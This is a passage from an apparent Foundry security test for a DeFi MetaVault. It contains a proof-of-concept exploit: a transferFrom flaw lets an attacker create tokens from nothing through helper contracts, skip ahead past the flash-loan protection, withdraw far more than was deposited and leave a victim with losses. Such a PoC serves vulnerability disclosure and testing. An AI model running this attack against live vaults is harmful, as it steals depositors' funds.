            // Transfer tokens to helper
            vm.prank(attacker);
            IERC20(metavault).transfer(helperContracts[i], artificialTokens);

            // Roll forward to avoid flash loan protection
            vm.roll(block.number + 6);

            // Make helper approve attacker
            vm.prank(helperContracts[i]);
            IERC20(metavault).approve(attacker, targetAmount);

            // Roll forward to avoid flash loan protection
            vm.roll(block.number + 6);

            // Exploit: transferFrom more than the balance
            vm.prank(attacker);
            IERC20(metavault).transferFrom(
                helperContracts[i],
                attacker,
                targetAmount
            );

            artificialTokens = IERC20(metavault).balanceOf(attacker);
            console.log(
                "After round %s: Attacker has %s tokens",
                i + 1,
                artificialTokens
            );
        }

        // 4. Show the damage
        uint totalSupplyAfter = IERC20(metavault).totalSupply();
        uint attackerTokensAfter = IERC20(metavault).balanceOf(attacker);

        console.log("\nATTACK RESULTS:");
        console.log("Total supply before:", totalSupplyBefore);
        console.log("Total supply after:", totalSupplyAfter);
        console.log(
            "Tokens created from nothing:",
            totalSupplyAfter - totalSupplyBefore
        );
        console.log(
            "Attacker's share of vault: %s%%",
            (attackerTokensAfter * 100) / totalSupplyAfter
        );

        // 5. Attacker withdraws inflated tokens
        // Roll forward to avoid flash loan protection
        vm.roll(block.number + 6);

        console.log("\nATTACKER WITHDRAWS:");

        // Calculate expected USD value based on share price and attacker tokens
        (uint sharePrice, , , ) = IMetaVault(metavault).internalSharePrice();
        uint withdrawUSDEstimate = (sharePrice * attackerTokensAfter) / 1e18;

        uint[] memory minAmountsOut = new uint[](assets.length);

        // Get attacker's asset balances before withdrawal
        uint[] memory assetBalancesBefore = new uint[](assets.length);
        for (uint i = 0; i < assets.length; i++) {
            assetBalancesBefore[i] = IERC20(assets[i]).balanceOf(attacker);
        }

        // Attacker withdraws
        vm.prank(attacker);
        IStabilityVault(metavault).withdrawAssets(
            assets,
            attackerTokensAfter,
            minAmountsOut
        );

        // Calculate actual amounts received
        uint[] memory amountsReceived = new uint[](assets.length);
        for (uint i = 0; i < assets.length; i++) {
            amountsReceived[i] =
                IERC20(assets[i]).balanceOf(attacker) -
                assetBalancesBefore[i];
        }

        // Get USD value of received assets
        (uint withdrawUSDActual, , , ) = priceReader.getAssetsPrice(
            assets,
            amountsReceived
        );

        console.log("Attacker's initial deposit: $%s", attackerDepositUSD);
        console.log(
            "Attacker withdrew approximately: $%s",
            withdrawUSDActual / 1e18
        );
        console.log(
            "Profit multiplier: %sx",
            withdrawUSDActual / (attackerDepositUSD * 1e18)
        );

        // 6. Victim tries to withdraw but gets less than expected
        // Roll forward to avoid flash loan protection
        vm.roll(block.number + 6);

        console.log("\nVICTIM WITHDRAWS:");

        // Get victim's asset balances before withdrawal
        for (uint i = 0; i < assets.length; i++) {
            assetBalancesBefore[i] = IERC20(assets[i]).balanceOf(victim);
        }

        // Victim withdraws
        vm.prank(victim);
        IStabilityVault(metavault).withdrawAssets(
            assets,
            victimShares,
            minAmountsOut
        );

        // Calculate actual amounts received
        for (uint i = 0; i < assets.length; i++) {
            amountsReceived[i] =
                IERC20(assets[i]).balanceOf(victim) -
                assetBalancesBefore[i];
        }

        // Get USD value of received assets
        (uint victimWithdrawUSD, , , ) = priceReader.getAssetsPrice(
            assets,
            amountsReceived
        );

        console.log("Victim's initial deposit: $%s", victimDepositUSD);
        console.log(
            "Victim withdrew approximately: $%s",
            victimWithdrawUSD / 1e18
        );
        console.log(
            "Percentage of deposit recovered: %s%%",
            (victimWithdrawUSD * 100) / (victimDepositUSD * 1e18)
        );
        console.log(
            "Victim's loss: $%s",
            victimDepositUSD - (victimWithdrawUSD / 1e18)
        );

        console.log("\n====== END OF TRANSFERFROM VULNERABILITY TEST ======");

        // Final assertion to demonstrate the vulnerability
        assertGt(
            totalSupplyAfter,
            totalSupplyBefore,
            "Token conservation principle violated: total supply should never increase without minting"
        );
    }
    //======================   Helper Functions   ==============================

    /*function _upgradePriceReader() internal {
        address[] memory proxies = new address[](1);
        proxies[0] = address(priceReader);
        address[] memory implementations = new address[](1);
        implementations[0] = address(new PriceReader());
        vm.startPrank(multisig);
        IPlatform(PLATFORM).announcePlatformUpgrade("2025.05.0-alpha", proxies, implementations);
        skip(1 days);
        IPlatform(PLATFORM).upgrade();
        vm.stopPrank();
    }*/

    /*function _upgradeCVaults() internal {
        IFactory factory = IFactory(IPlatform(PLATFORM).factory());

        // deploy new impl and upgrade
        address vaultImplementation = address(new CVault());
        vm.prank(multisig);
        factory.setVaultConfig(
            IFactory.VaultConfig({
                vaultType: VaultTypeLib.COMPOUNDING,
                implementation: vaultImplementation,
                deployAllowed: true,
                upgradeAllowed: true,
                buildingPrice: 1e10
            })
        );

        factory.upgradeVaultProxy(SonicConstantsLib.VAULT_C_USDC_SiF);
        factory.upgradeVaultProxy(SonicConstantsLib.VAULT_C_USDC_scUSD_ISF_scUSD);
        factory.upgradeVaultProxy(SonicConstantsLib.VAULT_C_USDC_scUSD_ISF_USDC);
        factory.upgradeVaultProxy(SonicConstantsLib.VAULT_C_USDC_S_8);
        factory.upgradeVaultProxy(SonicConstantsLib.VAULT_C_USDC_S_27);
        factory.upgradeVaultProxy(SonicConstantsLib.VAULT_C_USDC_S_34);
        factory.upgradeVaultProxy(SonicConstantsLib.VAULT_C_USDC_S_36);
        factory.upgradeVaultProxy(SonicConstantsLib.VAULT_C_USDC_S_49);
    }*/

    /*function _upgradePlatform() internal {
        address[] memory proxies = new address[](1);
        proxies[0] = PLATFORM;
        address[] memory implementations = new address[](1);
        implementations[0] = address(new Platform());
        vm.startPrank(multisig);
        IPlatform(PLATFORM).announcePlatformUpgrade("2025.05.1-alpha", proxies, implementations);
        skip(1 days);
        IPlatform(PLATFORM).upgrade();
        vm.stopPrank();
    }*/

    /*function _deployMetaVaultFactory() internal {
        Proxy proxy = new Proxy();
        proxy.initProxy(address(new MetaVaultFactory()));
        metaVaultFactory = IMetaVaultFactory(address(proxy));
        metaVaultFactory.initialize(PLATFORM);
    }*/

    function _setupMetaVaultFactory() internal {
        vm.prank(multisig);
        Platform(PLATFORM).setupMetaVaultFactory(address(metaVaultFactory));
    }

    function _setupImplementations() internal {
        address metaVaultImplementation = address(new MetaVault());
        address wrappedMetaVaultImplementation = address(
            new WrappedMetaVault()
        );
        vm.prank(multisig);
        metaVaultFactory.setMetaVaultImplementation(metaVaultImplementation);
        vm.prank(multisig);
        metaVaultFactory.setWrappedMetaVaultImplementation(
            wrappedMetaVaultImplementation
        );
    }

    function _deployMetaVaultByMetaVaultFactory(
        string memory type_,
        address pegAsset,
        string memory name_,
        string memory symbol_,
        address[] memory vaults_,
        uint[] memory proportions_
    ) internal returns (address metaVaultProxy) {
        vm.prank(multisig);
        return
            metaVaultFactory.deployMetaVault(
                bytes32(abi.encodePacked(name_)),
                type_,
                pegAsset,
                name_,
                symbol_,
                vaults_,
                proportions_
            );
    }

    function _deployWrapper(
        address metaVault
    ) internal returns (address wrapper) {
        vm.prank(multisig);
        return
            metaVaultFactory.deployWrapper(
                bytes32(uint(uint160(metaVault))),
                metaVault
            );
    }

    /*function _deployMetaVaultStandalone(
        string memory type_,
        address pegAsset,
        string memory name_,
        string memory symbol_,
        address[] memory vaults_,
        uint[] memory proportions_
    ) internal returns (address metaVaultProxy) {
        MetaVault implementation = new MetaVault();
        Proxy proxy = new Proxy();
        proxy.initProxy(address(implementation));
        MetaVault(address(proxy)).initialize(PLATFORM, type_, pegAsset, name_, symbol_, vaults_, proportions_);
        return address(proxy);
    }*/

    function _getAmountsForDeposit(
        uint usdValue,
        address[] memory assets
    ) internal view returns (uint[] memory depositAmounts) {
        depositAmounts = new uint[](assets.length);
        for (uint j; j < assets.length; ++j) {
            (uint price, ) = priceReader.getPrice(assets[j]);
            console.log("asset price>", price);
            require(
                price > 0,
                "UniversalTest: price is zero. Forget to add swapper routes?"
            );
            depositAmounts[j] =
                (usdValue * 10 ** IERC20Metadata(assets[j]).decimals() * 1e18) /
                price;
        }
    }

    function _dealAndApprove(
        address user,
        address metavault,
        address[] memory assets,
        uint[] memory amounts
    ) internal {
        for (uint j; j < assets.length; ++j) {
            deal(assets[j], user, amounts[j]);
            vm.prank(user);
            IERC20(assets[j]).approve(metavault, amounts[j]);
        }
    }
}

/**
 * @title ExploitHelper
 * @notice Helper contract to facilitate the transferFrom vulnerability exploit
 */
contract ExploitHelper {
    address public immutable metavault;

    constructor(address _metavault) {
        metavault = _metavault;
    }

    function approveSpender(address spender, uint amount) external {
        IERC20(metavault).approve(spender, amount);
    }
}
